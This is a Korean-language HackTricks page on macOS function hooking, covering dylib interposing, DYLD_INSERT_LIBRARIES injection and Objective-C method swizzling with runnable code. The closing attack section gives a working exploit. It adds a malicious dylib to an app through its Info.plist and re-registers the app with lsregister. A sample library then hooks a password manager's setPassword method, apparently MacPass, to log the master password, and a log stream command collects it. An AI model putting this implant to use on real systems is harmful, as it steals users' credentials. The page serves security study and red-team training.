# macOS 함수 후킹

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)를 통해 제로부터 영웅이 될 때까지 AWS 해킹을 배우세요</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되길 원하거나** **PDF로 HackTricks를 다운로드**하고 싶다면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 굿즈**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 우리의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f)이나 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)를 **팔로우**하세요.
* **해킹 트릭을 공유하려면 PR을** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 제출하세요.

</details>

## 함수 인터포징

**`__interpose` (`__DATA___interpose`)** 섹션(또는 **`S_INTERPOSING`**으로 플래그 지정된 섹션)을 포함하는 **함수 포인터**의 튜플을 포함하는 **dylib**를 만듭니다. 이 튜플은 **원본** 및 **대체** 함수를 참조합니다.

그런 다음, **`DYLD_INSERT_LIBRARIES`**를 사용하여 dylib를 **주입**합니다 (인터포징은 주 앱이 로드되기 전에 발생해야 합니다). 당연히 [**`DYLD_INSERT_LIBRARIES` 사용에 적용되는 제한 사항**도 여기에 적용됩니다](macos-library-injection/#check-restrictions).

### printf 인터포징

{% tabs %}
{% tab title="interpose.c" %}
{% code title="interpose.c" overflow="wrap" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{% endcode %}
{% endtab %}

{% tab title="hello.c" %}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{% endtab %}

{% tab title="interpose2.c" %}
{% code overflow="wrap" %}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{% endcode %}
{% endtab %}
{% endtabs %}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
{% hint style="warning" %}
**`DYLD_PRINT_INTERPOSTING`** 환경 변수는 interposing을 디버깅하는 데 사용될 수 있으며 interpose 프로세스를 출력합니다.
{% endhint %}

또한 **interposing은 프로세스와 로드된 라이브러리 사이에서 발생**하며 공유 라이브러리 캐시와는 작동하지 않음을 유의하십시오.

### 동적 Interposing

이제 **`dyld_dynamic_interpose`** 함수를 사용하여 함수를 동적으로 interpose하는 것도 가능합니다. 이를 통해 프로그램적으로 함수를 런타임에서만 교체할 수 있습니다.

**교체할 함수와 대체 함수의 튜플**을 지정하기만 하면 됩니다.
```c
struct dyld_interpose_tuple {
const void* replacement;
const void* replacee;
};
extern void dyld_dynamic_interpose(const struct mach_header* mh,
const struct dyld_interpose_tuple array[], size_t count);
```
## 메소드 스위즐링

ObjectiveC에서 메소드를 호출하는 방법은 다음과 같습니다: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

**객체**, **메소드**, **파라미터**가 필요합니다. 메소드가 호출되면 **메시지가 전송**되며 **`objc_msgSend`** 함수를 사용합니다: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

객체는 **`someObject`**, 메소드는 **`@selector(method1p1:p2:)`**, 인수는 **value1**, **value2**입니다.

객체 구조를 따라 **메소드 배열**에 도달하여 **이름** 및 **메소드 코드에 대한 포인터**를 **찾을 수** 있습니다.

{% hint style="danger" %}
메소드와 클래스는 이름을 기반으로 액세스되므로 이 정보는 이진 파일에 저장되므로 `otool -ov </path/bin>` 또는 [`class-dump </path/bin>`](https://github.com/nygard/class-dump)을 사용하여 검색할 수 있습니다.
{% endhint %}

### 원시 메소드에 액세스

다음 예제와 같이 메소드의 정보인 이름, 파라미터 수 또는 주소에 액세스할 수 있습니다:

{% code overflow="wrap" %}
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
{% endcode %}

### method_exchangeImplementations를 사용한 메소드 스위즐링

**`method_exchangeImplementations`** 함수는 **하나의 함수의 구현체의 주소를 다른 함수로 변경**할 수 있게 합니다.

{% hint style="danger" %}
따라서 함수가 호출될 때 **실행되는 것은 다른 함수**입니다.
{% endhint %}

{% code overflow="wrap" %}
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really colled

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
{% endcode %}

{% hint style="warning" %}
이 경우에는 **합법적인** 메소드의 **구현 코드가 메소드 이름을 확인**하면 이 스위즐링을 **감지**하고 실행을 방지할 수 있습니다.

다음 기술에는 이 제한이 없습니다.
{% endhint %}

### method\_setImplementation을 사용한 메소드 스위즐링

이전 형식은 이상하다. 왜냐하면 두 메소드의 구현을 서로 바꾸기 때문이다. **`method_setImplementation`** 함수를 사용하면 **한 메소드의 구현을 다른 메소드로 변경**할 수 있습니다.

새로운 구현에서 이전 구현의 주소를 호출할 예정이라면 덮어쓰기 전에 **원래 구현의 주소를 저장**해야 합니다. 나중에 그 주소를 찾는 것이 훨씬 복잡해질 것이기 때문입니다.

{% code overflow="wrap" %}
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
{% endcode %}

## 후킹 공격 방법론

이 페이지에서는 함수 후킹하는 다양한 방법에 대해 논의되었습니다. 그러나 이들은 **프로세스 내에서 코드를 실행하여 공격하는 것**을 포함했습니다.

이를 위해 가장 쉬운 기술은 [Dyld를 환경 변수나 해킹을 통해 주입하는 것](macos-library-injection/macos-dyld-hijacking-and-dyld\_insert\_libraries.md)입니다. 그러나 [Dylib 프로세스 주입](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port)을 통해서도 이 작업을 수행할 수 있다고 생각됩니다.

그러나 두 옵션 모두는 **보호되지 않은** 이진 파일/프로세스에 **제한**됩니다. 제한 사항에 대해 자세히 알아보려면 각 기술을 확인하십시오.

그러나 함수 후킹 공격은 매우 구체적입니다. 공격자는 이를 통해 **프로세스 내부에서 민감한 정보를 탈취**할 것입니다 (그렇지 않으면 프로세스 주입 공격을 수행할 것입니다). 그리고 이러한 민감한 정보는 MacPass와 같은 사용자 다운로드 앱에 위치할 수 있습니다.

따라서 공격자 벡터는 취약점을 찾거나 응용 프로그램의 서명을 제거하여, Info.plist를 통해 **`DYLD_INSERT_LIBRARIES`** 환경 변수를 주입하는 것과 같은 작업을 추가하는 것입니다:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
그런 다음 **애플리케이션을 다시 등록**하십시오:

{% code overflow="wrap" %}
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
{% endcode %}

해당 라이브러리에 후킹 코드를 추가하여 정보를 유출합니다: 비밀번호, 메시지...

{% hint style="danger" %}
새로운 macOS 버전에서는 애플리케이션 이진 파일의 서명을 제거하고 이전에 실행되었을 경우, macOS는 해당 애플리케이션을 더 이상 실행하지 않습니다.
{% endhint %}

#### 라이브러리 예제

{% code overflow="wrap" %}
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
{% endcode %}

## 참고 자료

* [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)로부터 제로에서 영웅까지 AWS 해킹 배우기</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 PDF로 다운로드하고 싶다면** [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>
